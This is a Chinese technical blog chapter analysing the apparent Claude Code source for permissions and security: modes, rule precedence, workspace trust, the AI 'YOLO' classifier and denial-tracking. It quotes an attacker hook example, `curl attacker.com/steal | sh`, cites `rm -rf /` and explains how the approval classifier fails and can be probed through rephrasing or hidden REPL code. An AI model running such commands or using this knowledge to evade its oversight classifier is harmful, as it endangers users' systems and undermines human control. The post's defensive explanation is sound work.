---
title: Claude Code 源码解析（四）· 权限与安全
description: 'LLM 拥有执行 Shell 命令和修改文件的能力，如何确保用户始终拥有控制权？如何在"自动化效率"和"安全可控"之间找到平衡？'
date: "2026-04-01"
series: Claude Code 源码解析
tags: [Claude Code, 源码解析, harness]
outline: 2
---

# 第四章：权限与安全系统（Permission & Security）

> Claude Code 如何在赋予 LLM 强大能力的同时，确保用户对每一步操作拥有控制权。

## 核心问题

Claude Code 面临一个根本性的安全悖论：

**它必须足够强大，才能有用——能读写文件、执行 shell 命令、修改代码。但它又必须足够安全，不能让 LLM 的一次"幻觉"就删掉用户的整个项目。**

这不是一个理论问题。考虑以下真实场景：

1. **LLM 幻觉风险**：模型可能"认为"需要执行 `rm -rf /` 来"清理环境"
2. **Prompt 注入风险**：恶意仓库的 `.claude/settings.json` 可能配置危险的 hooks 或环境变量，在用户不知情的情况下执行任意代码
3. **权限蔓延风险**：用户为了方便给了 `Bash(*)` 的 always allow，结果 LLM 用它来执行了不该执行的操作
4. **多 Agent 风险**：子代理在后台运行，没有 UI 可以弹出权限确认框，怎么办？
5. **企业合规风险**：企业管理员需要强制所有员工遵守特定的安全策略，不能被个人设置覆盖

Claude Code 的解法不是一个单一机制，而是一个**多层纵深防御体系**——从权限模式、规则系统、分类器、沙箱到企业策略，每一层都在不同维度上提供保护。

---

## 4.1 架构总览：纵深防御体系

```
工具调用请求 (tool_use block from API)
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 0: 信任边界 (Trust Boundary)                          │
│  ─────────────────────────────────────────────────────────── │
│  • TrustDialog: 用户是否信任当前工作目录？                     │
│  • 信任建立前：不执行 apiKeyHelper、不运行 git hooks、          │
│    不应用项目级环境变量、不执行 statusLine 命令                 │
│  • 某些设置项永远不信任 projectSettings                        │
└─────────────────────────────────────────────────────────────┘
         │ 信任已建立
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: 规则引擎 (Rule Engine)                             │
│  ─────────────────────────────────────────────────────────── │
│  Step 1a: alwaysDeny 规则 → 直接拒绝                         │
│  Step 1b: alwaysAsk 规则 → 强制询问（除非沙箱可自动放行）      │
│  Step 1c: tool.checkPermissions() → 工具自身的权限检查         │
│  Step 1d: 工具实现拒绝 → 直接拒绝                             │
│  Step 1e: requiresUserInteraction → 必须询问                  │
│  Step 1f: 内容级 ask 规则 → 即使 bypass 模式也必须询问         │
│  Step 1g: safetyCheck → 安全检查（bypass-immune）             │
└─────────────────────────────────────────────────────────────┘
         │ 规则未拒绝
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: 模式决策 (Mode Decision)                           │
│  ─────────────────────────────────────────────────────────── │
│  Step 2a: bypassPermissions 模式 → 直接放行                   │
│  Step 2b: alwaysAllow 规则 → 放行                            │
│  Step 3:  passthrough → 转为 ask                             │
└─────────────────────────────────────────────────────────────┘
         │ 需要进一步决策
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: 模式后处理 (Post-Mode Processing)                   │
│  ─────────────────────────────────────────────────────────── │
│  • dontAsk 模式: ask → deny                                  │
│  • auto 模式: 运行 AI 分类器决策                              │
│    ├─ acceptEdits 快速路径: 安全操作直接放行                   │
│    ├─ 安全工具白名单: 已知安全工具直接放行                     │
│    └─ YOLO 分类器: AI 判断是否安全                            │
│  • 异步 Agent: 运行 PermissionRequest hooks → 否则 deny       │
└─────────────────────────────────────────────────────────────┘
         │ behavior = 'ask'
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: 交互式决策 (Interactive Decision)                   │
│  ─────────────────────────────────────────────────────────── │
│  • Coordinator handler: 协调器模式下的自动化检查               │
│  • Swarm worker handler: Swarm 模式下的权限转发               │
│  • Bash 分类器投机检查: 2s 宽限期等待分类器结果                │
│  • 交互式权限弹窗: 用户手动 allow/deny                        │
│    ├─ PreToolUse hooks: 用户自定义钩子可自动决策               │
│    ├─ Bash 分类器: 后台运行，可在用户响应前自动放行            │
│    └─ 用户选择: Allow / Deny / Always Allow                   │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 5: 执行时沙箱 (Runtime Sandbox)                       │
│  ─────────────────────────────────────────────────────────── │
│  • macOS Seatbelt: 文件系统/网络访问限制                      │
│  • 路径验证: 工作目录边界检查                                  │
│  • 文件系统权限: 额外工作目录管理                              │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 6: 企业策略覆盖 (Enterprise Policy Override)           │
│  ─────────────────────────────────────────────────────────── │
│  • Remote Managed Settings: 远程下发，最高优先级               │
│  • MDM (plist/HKLM): 设备管理策略                             │
│  • Managed Settings Files: 文件级策略                         │
│  • Policy Limits: 功能级开关                                  │
│  • 所有层级的规则都可被企业策略覆盖                            │
└─────────────────────────────────────────────────────────────┘
```

这个架构的核心设计哲学是**纵深防御（Defense in Depth）**：任何单一层的失败都不会导致完全失控。即使规则引擎被绕过，沙箱仍然限制了文件系统访问；即使沙箱被禁用，safetyCheck 仍然保护关键路径；即使用户选择了 bypassPermissions，deny 规则和 safetyCheck 仍然生效。

---

## 4.2 权限模式（Permission Modes）

### 面临的问题

不同用户对安全性的需求差异巨大：

- **新手用户**：希望每一步都确认，宁可慢也不要出错
- **熟练用户**：信任 Claude 的文件编辑，但对 shell 命令保持警惕
- **高级用户**：完全信任 Claude，不想被权限弹窗打断心流
- **企业用户**：需要在自动化和合规之间找到平衡

一个固定的权限策略无法满足所有人。

### 解法：多模式权限体系

```typescript
// src/types/permissions.ts

export const EXTERNAL_PERMISSION_MODES = [
  'acceptEdits',
  'bypassPermissions',
  'default',
  'dontAsk',
  'plan',
] as const

// 内部模式包含 auto（需要 TRANSCRIPT_CLASSIFIER feature flag）
export type InternalPermissionMode = ExternalPermissionMode | 'auto' | 'bubble'
```

| 模式 | 行为 | 适用场景 |
|------|------|---------|
| `default` | 每个工具调用都需要用户确认 | 新手、敏感操作 |
| `acceptEdits` | 文件读写自动放行，shell 命令需确认 | 日常开发 |
| `plan` | 只读操作自动放行，写入操作需确认 | 规划阶段 |
| `bypassPermissions` | 几乎所有操作自动放行（deny 规则和 safetyCheck 仍生效） | 高级用户、自动化 |
| `dontAsk` | 将所有 `ask` 转为 `deny`，绝不弹窗 | 非交互式脚本 |
| `auto` | 用 AI 分类器代替人工确认（内部特性） | 全自动工作流 |

### 模式切换：Shift+Tab 循环

```typescript
// src/utils/permissions/getNextPermissionMode.ts

export function getNextPermissionMode(
  toolPermissionContext: ToolPermissionContext,
): PermissionMode {
  switch (toolPermissionContext.mode) {
    case 'default':
      // Anthropic 内部用户跳过 acceptEdits 和 plan
      if (process.env.USER_TYPE === 'ant') {
        if (toolPermissionContext.isBypassPermissionsModeAvailable) {
          return 'bypassPermissions'
        }
        if (canCycleToAuto(toolPermissionContext)) {
          return 'auto'
        }
        return 'default'
      }
      return 'acceptEdits'

    case 'acceptEdits':
      return 'plan'

    case 'plan':
      if (toolPermissionContext.isBypassPermissionsModeAvailable) {
        return 'bypassPermissions'
      }
      if (canCycleToAuto(toolPermissionContext)) {
        return 'auto'
      }
      return 'default'

    case 'bypassPermissions':
      if (canCycleToAuto(toolPermissionContext)) {
        return 'auto'
      }
      return 'default'

    default:
      return 'default'
  }
}
```

### 设计决策讨论

**为什么 `bypassPermissions` 不是真正的"绕过一切"？**

名字叫 "bypass permissions"，但源码中有多处硬编码的例外：

```typescript
// permissions.ts — Step 1f
// 内容级 ask 规则即使在 bypass 模式下也必须询问
if (
  toolPermissionResult?.behavior === 'ask' &&
  toolPermissionResult.decisionReason?.type === 'rule' &&
  toolPermissionResult.decisionReason.rule.ruleBehavior === 'ask'
) {
  return toolPermissionResult  // bypass 模式也不能跳过
}

// Step 1g
// safetyCheck 是 bypass-immune 的
if (
  toolPermissionResult?.behavior === 'ask' &&
  toolPermissionResult.decisionReason?.type === 'safetyCheck'
) {
  return toolPermissionResult  // bypass 模式也不能跳过
}
```

这是一个**有意的设计**：`bypassPermissions` 的语义不是"关闭所有安全检查"，而是"跳过常规的权限确认弹窗"。用户显式配置的 deny/ask 规则、以及保护 `.git/`、`.claude/` 等关键路径的 safetyCheck，在任何模式下都不可绕过。

这体现了一个重要原则：**用户的显式安全意图（deny/ask 规则）优先于便利性设置（bypass 模式）。**

**为什么 `auto` 模式需要 feature flag 门控？**

`auto` 模式使用 AI 分类器来代替人工确认——这本身就是一个高风险特性。如果分类器判断错误，可能导致危险操作被自动执行。因此它被 `TRANSCRIPT_CLASSIFIER` feature flag 门控，只在内部构建中可用，并且有额外的安全机制（denial tracking、fail-closed 等）。

**为什么 `plan` 模式在 bypass 可用时会继承 bypass 行为？**

```typescript
const shouldBypassPermissions =
  appState.toolPermissionContext.mode === 'bypassPermissions' ||
  (appState.toolPermissionContext.mode === 'plan' &&
    appState.toolPermissionContext.isBypassPermissionsModeAvailable)
```

这是因为 `plan` 模式可以由模型主动进入（通过 `EnterPlanModeTool`）。如果用户原本在 `bypassPermissions` 模式下，模型进入 plan 模式不应该降低权限——用户已经表达了"我信任这个工具"的意图。

---

## 4.3 权限规则系统

### 面临的问题

模式提供了粗粒度的控制，但用户经常需要更精细的策略：

- "允许所有 `npm` 命令，但禁止 `npm publish`"
- "允许 `FileEdit`，但禁止编辑 `.env` 文件"
- "允许 MCP 服务器 `server1` 的所有工具，但禁止 `server2`"

这需要一个**基于规则的权限系统**，支持工具级和内容级的精细控制。

### 规则的三要素

```typescript
// src/types/permissions.ts

export type PermissionRule = {
  source: PermissionRuleSource    // 规则来自哪里
  ruleBehavior: PermissionBehavior // 规则的行为
  ruleValue: PermissionRuleValue   // 规则匹配什么
}

// 行为：三种
export type PermissionBehavior = 'allow' | 'deny' | 'ask'

// 来源：八种
export type PermissionRuleSource =
  | 'userSettings'      // ~/.claude/settings.json
  | 'projectSettings'   // .claude/settings.json
  | 'localSettings'     // .claude/settings.local.json
  | 'flagSettings'      // SDK 内联设置
  | 'policySettings'    // 企业策略（MDM/远程）
  | 'cliArg'            // CLI 参数
  | 'command'           // 斜杠命令
  | 'session'           // 运行时动态添加

// 值：工具名 + 可选内容
export type PermissionRuleValue = {
  toolName: string       // 如 "Bash", "FileEdit", "mcp__server1"
  ruleContent?: string   // 如 "npm install", "prefix:git *"
}
```

### 规则解析：`ToolName(content)` 语法

```typescript
// src/utils/permissions/permissionRuleParser.ts

// 规则字符串格式: "ToolName" 或 "ToolName(content)"
permissionRuleValueFromString('Bash')
// => { toolName: 'Bash' }

permissionRuleValueFromString('Bash(npm install)')
// => { toolName: 'Bash', ruleContent: 'npm install' }

// 支持转义：括号在内容中需要转义
permissionRuleValueFromString('Bash(python -c "print\\(1\\)")')
// => { toolName: 'Bash', ruleContent: 'python -c "print(1)"' }

// 空内容或通配符视为工具级规则
permissionRuleValueFromString('Bash()')   // => { toolName: 'Bash' }
permissionRuleValueFromString('Bash(*)')  // => { toolName: 'Bash' }
```

### 规则匹配的优先级

规则匹配遵循一个严格的优先级链，在 `hasPermissionsToUseToolInner()` 中实现：

```
Step 1a: deny 规则（工具级）     → 最高优先级，直接拒绝
Step 1b: ask 规则（工具级）      → 强制询问
Step 1c: tool.checkPermissions() → 工具自身检查（含内容级规则匹配）
Step 1d: 工具实现拒绝            → 直接拒绝
Step 1e: requiresUserInteraction → 必须询问
Step 1f: 内容级 ask 规则         → bypass-immune
Step 1g: safetyCheck             → bypass-immune
Step 2a: bypassPermissions 模式  → 放行
Step 2b: allow 规则（工具级）    → 放行
Step 3:  passthrough → ask       → 转为询问
```

**关键洞察：deny 和 ask 规则在 allow 规则之前检查。** 这意味着如果你同时配置了 `Bash` 的 allow 和 `Bash(rm -rf)` 的 deny，deny 会在 `tool.checkPermissions()` 阶段被匹配到（BashTool 内部会检查子命令级规则），从而阻止危险命令，即使工具级 allow 规则存在。

### MCP 工具的规则匹配

MCP 工具有特殊的命名约定和匹配逻辑：

```typescript
// permissions.ts

function toolMatchesRule(tool, rule): boolean {
  // 直接名称匹配
  if (rule.ruleValue.toolName === nameForRuleMatch) return true

  // MCP 服务器级匹配：
  // 规则 "mcp__server1" 匹配工具 "mcp__server1__tool1"
  // 规则 "mcp__server1__*" 匹配 server1 的所有工具
  const ruleInfo = mcpInfoFromString(rule.ruleValue.toolName)
  const toolInfo = mcpInfoFromString(nameForRuleMatch)

  return (
    ruleInfo !== null && toolInfo !== null &&
    (ruleInfo.toolName === undefined || ruleInfo.toolName === '*') &&
    ruleInfo.serverName === toolInfo.serverName
  )
}
```

这允许用户用一条规则控制整个 MCP 服务器的所有工具，而不需要逐个配置。

### 规则来源的层级与安全边界

规则来自八种来源，但并非所有来源都是等价的。源码中有多处**显式排除 `projectSettings`** 的逻辑：

```typescript
// src/utils/settings/settings.ts

// 这些设置只信任 user/local/flag/policy，不信任 project
export function hasSkipDangerousModePermissionPrompt(): boolean {
  // 显式排除 projectSettings —— 恶意项目不能自动跳过危险模式确认
}

export function hasAutoModeOptIn(): boolean {
  // 显式排除 projectSettings
}

export function getAutoModeConfig(): AutoModeConfig {
  // 显式排除 projectSettings —— 防止注入分类器 allow/deny 规则
}
```

**为什么 `projectSettings` 不被信任？**

因为 `.claude/settings.json` 是项目仓库的一部分，可以被任何有仓库写权限的人修改。一个恶意的 PR 可以在 `.claude/settings.json` 中添加 `"skipDangerousModePermissionPrompt": true`，如果这个设置被信任，用户 clone 这个仓库后就会在不知情的情况下跳过安全确认。

这是 Claude Code 安全模型中最重要的设计决策之一：**项目级配置是不可信的输入，必须在信任边界之外处理。**

### 设计决策讨论

**为什么用字符串规则而不是结构化的 JSON 规则？**

规则格式 `"Bash(npm install)"` 看起来很原始——为什么不用 `{ tool: "Bash", pattern: "npm install", type: "prefix" }` 这样的结构化格式？

原因是**用户体验**。规则需要在 `settings.json` 中手动编辑，也需要在权限弹窗中一键添加。字符串格式更紧凑、更易读、更容易复制粘贴。结构化格式虽然更精确，但会让 `settings.json` 变得冗长，增加用户的认知负担。

代价是需要一个解析器（`permissionRuleParser.ts`）来处理转义和边界情况，但这个复杂性被封装在了一个地方。

**为什么 `passthrough` 不是 `allow`？**

`tool.checkPermissions()` 可以返回四种行为：`allow`、`deny`、`ask`、`passthrough`。`passthrough` 的语义是"我没有意见，交给上层决定"。

如果没有 `passthrough`，工具要么必须返回 `allow`（可能绕过模式检查），要么返回 `ask`（可能导致不必要的弹窗）。`passthrough` 让工具可以说"我检查了，没发现问题，但我不做最终决定"——最终决定权交给模式和规则系统。

---

## 4.4 权限检查流程：从工具调用到最终决策

### 面临的问题

权限检查不是一个简单的 `if-else`。它涉及多个异步步骤、多种决策来源（规则、模式、分类器、hooks、用户交互），以及多种运行环境（交互式 CLI、后台 Agent、IDE Bridge、Swarm Worker）。如何设计一个统一的检查流程，既能覆盖所有场景，又不至于过于复杂？

### 数据流：完整的权限检查链路

```
API 返回 tool_use block
         │
         ▼
┌─ useCanUseTool (React Hook) ─────────────────────────────┐
│                                                           │
│  创建 PermissionContext                                    │
│  检查 abort 状态                                           │
│         │                                                 │
│         ▼                                                 │
│  hasPermissionsToUseTool()  ← 核心决策函数                 │
│  ┌──────────────────────────────────────────────────┐     │
│  │ hasPermissionsToUseToolInner()                    │     │
│  │   Step 1a: getDenyRuleForTool()                   │     │
│  │   Step 1b: getAskRuleForTool()                    │     │
│  │   Step 1c: tool.checkPermissions(input, context)  │     │
│  │   Step 1d-1g: 各种安全检查                         │     │
│  │   Step 2a: bypassPermissions 检查                  │     │
│  │   Step 2b: toolAlwaysAllowedRule()                │     │
│  │   Step 3: passthrough → ask                       │     │
│  └──────────────────────────────────────────────────┘     │
│         │                                                 │
│         ▼                                                 │
│  后处理: dontAsk / auto / asyncAgent 模式转换              │
│         │                                                 │
│         ▼                                                 │
│  ┌─ 结果分发 ────────────────────────────────────────┐    │
│  │ allow → 直接返回                                   │    │
│  │ deny  → 直接返回                                   │    │
│  │ ask   → 进入交互式决策流程                          │    │
│  └────────────────────────────────────────────────────┘    │
│         │ (ask)                                           │
│         ▼                                                 │
│  ┌─ 交互式决策 ──────────────────────────────────────┐    │
│  │ 1. handleCoordinatorPermission()                   │    │
│  │ 2. handleSwarmWorkerPermission()                   │    │
│  │ 3. Bash 分类器投机检查 (2s 宽限期)                  │    │
│  │ 4. handleInteractivePermission()                   │    │
│  │    ├─ PreToolUse hooks (后台)                      │    │
│  │    ├─ Bash 分类器 (后台)                           │    │
│  │    └─ 权限弹窗 (前台)                              │    │
│  └────────────────────────────────────────────────────┘    │
└───────────────────────────────────────────────────────────┘
```

### 核心函数：`hasPermissionsToUseTool`

这是权限系统的入口点，定义在 `src/utils/permissions/permissions.ts`：

```typescript
export const hasPermissionsToUseTool: CanUseToolFn = async (
  tool, input, context, assistantMessage, toolUseID,
): Promise<PermissionDecision> => {
  // 1. 运行内部规则检查
  const result = await hasPermissionsToUseToolInner(tool, input, context)

  // 2. allow 时重置 denial tracking（打断连续拒绝计数）
  if (result.behavior === 'allow') {
    // ... 重置 consecutiveDenials
    return result
  }

  // 3. ask 时进行模式后处理
  if (result.behavior === 'ask') {
    // dontAsk 模式：ask → deny
    if (appState.toolPermissionContext.mode === 'dontAsk') {
      return { behavior: 'deny', message: DONT_ASK_REJECT_MESSAGE(tool.name) }
    }

    // auto 模式：运行 AI 分类器
    if (mode === 'auto') {
      // ... 分类器逻辑（见 4.6 节）
    }

    // 异步 Agent：运行 hooks → 否则 deny
    if (shouldAvoidPermissionPrompts) {
      const hookDecision = await runPermissionRequestHooksForHeadlessAgent(...)
      if (hookDecision) return hookDecision
      return { behavior: 'deny', message: AUTO_REJECT_MESSAGE(tool.name) }
    }
  }

  return result
}
```

### `useCanUseTool` Hook：连接规则引擎与 UI

`useCanUseTool`（`src/hooks/useCanUseTool.tsx`）是一个 React Hook，它将纯逻辑的 `hasPermissionsToUseTool` 与 React 状态和 UI 组件连接起来：

```typescript
function useCanUseTool(setToolUseConfirmQueue, setToolPermissionContext) {
  return useCallback(async (tool, input, toolUseContext, ...) => {
    return new Promise(resolve => {
      // 1. 创建权限上下文
      const ctx = createPermissionContext(tool, input, ...)

      // 2. 检查是否已 abort
      if (ctx.resolveIfAborted(resolve)) return

      // 3. 运行规则检查
      const result = await hasPermissionsToUseTool(tool, input, ...)

      // 4. 根据结果分发
      switch (result.behavior) {
        case 'allow':
          resolve(ctx.buildAllow(result.updatedInput ?? input))
          return

        case 'deny':
          resolve(result)
          return

        case 'ask':
          // 4a. Coordinator 模式：等待自动化检查
          // 4b. Swarm Worker：转发给 leader
          // 4c. Bash 分类器投机检查（2s 宽限期）
          // 4d. 交互式权限弹窗
          handleInteractivePermission({ctx, description, result, ...}, resolve)
          return
      }
    })
  }, [setToolUseConfirmQueue, setToolPermissionContext])
}
```

### Bash 分类器的投机执行（Speculative Execution）

这是权限检查流程中最精妙的优化之一。当 Bash 命令需要用户确认时，分类器可能已经在后台运行了。`useCanUseTool` 会在显示弹窗之前等待最多 2 秒：

```typescript
// useCanUseTool.tsx — ask 分支中

if (feature('BASH_CLASSIFIER') && result.pendingClassifierCheck) {
  const speculativePromise = peekSpeculativeClassifierCheck(input.command)
  if (speculativePromise) {
    // 与 2s 超时竞争
    const raceResult = await Promise.race([
      speculativePromise.then(r => ({ type: 'result', result: r })),
      new Promise(res => setTimeout(res, 2000, { type: 'timeout' })),
    ])

    if (raceResult.type === 'result' &&
        raceResult.result.matches &&
        raceResult.result.confidence === 'high') {
      // 分类器在 2s 内返回了高置信度的 allow → 跳过弹窗
      setClassifierApproval(toolUseID, raceResult.result.matchedDescription)
      resolve(ctx.buildAllow(input))
      return
    }
    // 超时或不匹配 → 继续显示弹窗
  }
}
```

**为什么是 2 秒？** 这是一个用户体验的权衡：
- 太短（如 500ms）：分类器来不及返回，大部分投机执行都浪费了
- 太长（如 5s）：用户会感到明显的延迟，"为什么弹窗这么慢？"
- 2 秒是一个"用户刚开始注意到延迟"的临界点，大部分分类器调用能在这个时间内完成

### 设计决策讨论

**为什么权限检查是异步的？**

`hasPermissionsToUseTool` 是一个 `async` 函数，这看起来不寻常——权限检查不应该是纯同步的规则匹配吗？

原因是 `tool.checkPermissions()` 可能需要异步操作：
- BashTool 需要解析复合命令（可能涉及 shell 解析）
- FileEditTool 需要检查文件路径是否在允许范围内
- 沙箱检查可能需要查询沙箱状态

此外，auto 模式的分类器调用是一个 API 请求，天然是异步的。

**为什么 `useCanUseTool` 用 `new Promise` 而不是直接 `await`？**

因为交互式权限弹窗的生命周期不是简单的 `await`——它需要：
1. 将弹窗加入 UI 队列（`setToolUseConfirmQueue`）
2. 等待用户交互（可能是几秒到几分钟）
3. 在等待期间，后台的 hooks 和分类器可能会自动解决
4. 用户可能 abort 整个请求

`Promise` 构造器模式让 `resolve` 可以被传递给多个异步路径（弹窗回调、hook 回调、分类器回调），谁先完成谁就 resolve。

---

## 4.5 信任边界（Trust Boundary）

### 面临的问题

想象这个攻击场景：

1. 攻击者创建一个开源项目，在 `.claude/settings.json` 中配置了恶意的 hooks（如 `PreToolUse` hook 执行 `curl attacker.com/steal | sh`）
2. 受害者 `git clone` 这个项目，然后运行 `claude`
3. 如果 Claude Code 无条件加载项目设置，恶意 hook 会在第一次工具调用时自动执行

这不是假设——任何接受项目级配置的工具都面临这个风险（VS Code 的 `.vscode/settings.json` 也有类似问题）。

### 解法：TrustDialog — 工作区信任门控

Claude Code 在加载项目级危险配置之前，会弹出一个信任对话框：

```typescript
// src/components/TrustDialog/TrustDialog.tsx

// TrustDialog 检查的危险项：
const hasMcpServers = getMcpConfigsByScope('project').length > 0
const hasHooks = getHooksSources().length > 0
const hasApiKeyHelper = getApiKeyHelperSources().length > 0
const hasDangerousEnvVars = getDangerousEnvVarsSources().length > 0
const hasSlashCommandBash = /* 项目/本地命令中允许 Bash 的 */
// ... 以及 AWS/GCP helper、OTEL headers helper 等

// 用户选择
onChange(value: 'enable_all' | 'exit') {
  if (value === 'exit') {
    gracefulShutdownSync(1)  // 拒绝 → 直接退出
  } else {
    // 接受信任
    if (isHomeDirectory) {
      setSessionTrustAccepted(true)   // 家目录：仅本次会话
    } else {
      saveCurrentProjectConfig(prev =>
        ({ ...prev, hasTrustDialogAccepted: true }))  // 项目目录：持久化
    }
  }
}
```

### 信任建立前的安全约束

在用户接受信任之前，Claude Code 会刻意避免执行以下操作：

| 被阻止的操作 | 原因 | 源码位置 |
|-------------|------|---------|
| `apiKeyHelper` 执行 | 可执行任意命令窃取 API Key | `hooks/useApiKeyVerification.ts` |
| 项目级环境变量应用 | 可修改 PATH 等导致命令劫持 | `main.tsx` (`applySafeConfigEnvironmentVariables` vs `applyConfigEnvironmentVariables`) |
| StatusLine 命令执行 | 可执行任意 shell 命令 | `components/StatusLine.tsx` |
| Git 命令预取 | Git hooks 可执行任意代码 | `main.tsx` (`prefetchSystemContextIfSafe`) |

```typescript
// hooks/useApiKeyVerification.ts — 关键注释
// 避免在信任对话框显示前执行 apiKeyHelper
// 安全考虑：防止通过 settings.json 实现 RCE
getAnthropicApiKeyWithSource({
  skipRetrievingKeyFromApiKeyHelper: true  // 信任前跳过
})
```

### 设计决策讨论

**为什么家目录的信任是"仅本次会话"？**

家目录（`~`）通常是用户运行 `claude` 的默认位置。如果持久化信任，等于永远不会再弹出信任对话框——即使家目录下后来出现了恶意的 `.claude/settings.json`。session-only 信任确保每次新会话都会重新检查。

**为什么 TrustDialog 不审批 MCP 服务器？**

源码注释明确说明：MCP 服务器的审批由独立的 `mcpServerApproval` 流程处理。这是**职责分离**——TrustDialog 处理"是否信任这个目录"，MCP 审批处理"是否信任这个外部服务"。两个维度的信任决策不应该混在一起。

---

## 4.6 Auto 模式与 YOLO 分类器

### 面临的问题

`bypassPermissions` 模式的问题是它**不加区分地放行一切**（除了 deny 规则和 safetyCheck）。这在实践中要么太危险（用户不敢开），要么太限制（想自动化但担心失控）。

能不能有一种模式，**让 AI 来判断每个操作是否安全**，安全的自动放行，危险的自动拒绝？

### 解法：Auto 模式的三级决策

Auto 模式不是简单地调用一个分类器——它有一个精心设计的三级快速路径，避免不必要的 API 调用：

```
tool_use 到达 auto 模式处理
         │
         ▼
┌─ Level 1: acceptEdits 快速路径 ───────────────────────┐
│  模拟 acceptEdits 模式调用 tool.checkPermissions()     │
│  如果 acceptEdits 会放行 → 直接放行（零 API 调用）      │
│  跳过条件：Agent/REPL 工具（可能包含危险嵌套操作）      │
└───────────────────────────────────────────────────────┘
         │ acceptEdits 不会放行
         ▼
┌─ Level 2: 安全工具白名单 ─────────────────────────────┐
│  isAutoModeAllowlistedTool(tool.name)                  │
│  已知安全的工具直接放行（零 API 调用）                   │
└───────────────────────────────────────────────────────┘
         │ 不在白名单中
         ▼
┌─ Level 3: YOLO 分类器 ───────────────────────────────┐
│  classifyYoloAction(messages, action, tools, ...)     │
│  调用 AI API 分析完整对话上下文 + 当前操作              │
│  返回 shouldBlock / reason / usage                    │
└───────────────────────────────────────────────────────┘
```

### Level 1：acceptEdits 快速路径

```typescript
// permissions.ts — auto 模式处理段

// 模拟 acceptEdits 模式检查
if (result.behavior === 'ask' &&
    tool.name !== AGENT_TOOL_NAME &&
    tool.name !== REPL_TOOL_NAME) {
  const acceptEditsResult = await tool.checkPermissions(parsedInput, {
    ...context,
    getAppState: () => ({
      ...state,
      toolPermissionContext: {
        ...state.toolPermissionContext,
        mode: 'acceptEdits',  // 假装在 acceptEdits 模式
      },
    }),
  })
  if (acceptEditsResult.behavior === 'allow') {
    // 如果 acceptEdits 会放行，auto 模式也直接放行
    return { behavior: 'allow', ... }
  }
}
```

**为什么排除 Agent 和 REPL 工具？**

源码注释解释了原因：

> Skip for Agent and REPL — their checkPermissions returns 'allow' for acceptEdits mode, which would silently bypass the classifier. REPL code can contain VM escapes between inner tool calls; the classifier must see the glue JavaScript, not just the inner tool calls.

Agent 工具在 acceptEdits 模式下总是返回 allow（因为它只是启动子代理），但子代理内部可能执行危险操作。REPL 工具的 JavaScript 代码可能包含 VM 逃逸。这两种情况都需要分类器审查完整上下文。

### Level 3：YOLO 分类器

```typescript
// src/utils/permissions/yoloClassifier.ts

// 分类器使用独立的 sideQuery（不计入主对话的 token 用量）
// 发送完整的对话上下文 + 当前工具调用 + 用户自定义的 allow/deny 规则

export async function classifyYoloAction(
  messages: Message[],
  action: string,
  tools: Tools,
  toolPermissionContext: ToolPermissionContext,
  signal: AbortSignal,
): Promise<YoloClassifierResult> {
  // 构建分类器 system prompt（包含用户自定义的 allow/deny 规则）
  // 发送对话历史 + 当前 action
  // 解析分类器响应：shouldBlock / reason
}
```

分类器的核心设计：

- **输入**：完整的对话上下文 + 当前工具调用的详细描述
- **输出**：`shouldBlock`（布尔值）+ `reason`（解释）
- **模型**：使用独立的 API 调用（`sideQuery`），不影响主对话的 token 计量
- **用户自定义规则**：分类器的 system prompt 中嵌入了用户通过 `autoMode` 配置的 allow/deny 描述
- **两阶段分类**：支持 fast（快速非 thinking）和 thinking（深度推理）两个阶段

### 分类器的失败处理

```typescript
// 分类器不可用时的行为取决于 feature flag
if (classifierResult.unavailable) {
  if (getFeatureValue_CACHED_WITH_REFRESH(
    'tengu_iron_gate_closed', true, 30 * 60 * 1000
  )) {
    // fail-closed：拒绝并引导用户重试
    return { behavior: 'deny', message: buildClassifierUnavailableMessage(...) }
  }
  // fail-open：回退到正常权限处理（显示弹窗）
  return result
}

// 对话上下文超出分类器窗口
if (classifierResult.transcriptTooLong) {
  if (shouldAvoidPermissionPrompts) {
    // 无头模式：永久性问题，直接 abort
    throw new AbortError('transcript exceeded context window in headless mode')
  }
  // 交互模式：回退到手动审批
  return { ...result, decisionReason: { type: 'other', reason: '...' } }
}
```

**为什么默认 fail-closed？**

`tengu_iron_gate_closed` 默认为 `true`——即当分类器不可用时，**拒绝操作**而非放行。这是一个深思熟虑的安全决策：如果用户选择了 auto 模式，意味着他们期望**所有操作都经过 AI 审查**。分类器不可用时静默放行，违反了用户的安全期望。

---

## 4.7 Denial Tracking：连续拒绝的熔断机制

### 面临的问题

Auto 模式分类器可能进入一个死循环：模型持续尝试某个被拒绝的操作→分类器持续拒绝→模型换个说法再试→再次被拒绝……这会浪费大量的分类器 API 调用，用户看到的只是模型不断"失败重试"。

### 解法：Denial Tracking 熔断器

```typescript
// src/utils/permissions/denialTracking.ts

export type DenialTrackingState = {
  consecutiveDenials: number
  totalDenials: number
}

export const DENIAL_LIMITS = {
  maxConsecutive: 3,   // 连续 3 次拒绝 → 回退到手动审批
  maxTotal: 20,        // 累计 20 次拒绝 → 回退到手动审批
}

export function shouldFallbackToPrompting(state: DenialTrackingState): boolean {
  return (
    state.consecutiveDenials >= DENIAL_LIMITS.maxConsecutive ||
    state.totalDenials >= DENIAL_LIMITS.maxTotal
  )
}
```

**行为模式：**

```
Auto 模式运行中
  │
  ├─ 分类器 allow → consecutiveDenials 归零
  ├─ 分类器 deny  → consecutiveDenials++, totalDenials++
  │
  └─ 达到限制？
      ├─ 交互模式 → 回退到手动弹窗，让用户自行决定
      └─ 无头模式 → throw AbortError（终止整个 Agent）
```

### 子代理的 Denial Tracking 隔离

```typescript
// permissions.ts

function persistDenialState(context: ToolUseContext, newState): void {
  if (context.localDenialTracking) {
    // 异步子代理：setAppState 是 no-op，直接原地修改
    Object.assign(context.localDenialTracking, newState)
  } else {
    // 主代理：写入 AppState
    context.setAppState(prev => ({ ...prev, denialTracking: newState }))
  }
}
```

子代理（`LocalAgentTask`）的 `setAppState` 是一个 no-op——它们不能修改父代理的状态。为了让 denial tracking 仍然有效，子代理使用 `localDenialTracking`——一个本地的可变对象，通过 `Object.assign` 直接修改。

